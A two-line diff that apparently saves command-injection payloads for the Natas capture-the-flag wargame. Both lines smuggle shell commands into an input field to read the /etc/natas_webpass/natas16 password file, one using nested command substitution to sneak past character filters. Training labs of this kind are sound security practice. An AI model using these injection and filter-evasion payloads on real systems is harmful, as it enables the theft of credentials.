@@ -1,0 +1,2 @@
+# ." /etc/natas_webpass/natas16 #
+.$(echo $(tail -n1 <(head -n20 <(uniq <(sort <(grep -o [[:punct:]] <(man -P cat ascii)))))) /etc/natas_webpass/natas16) #
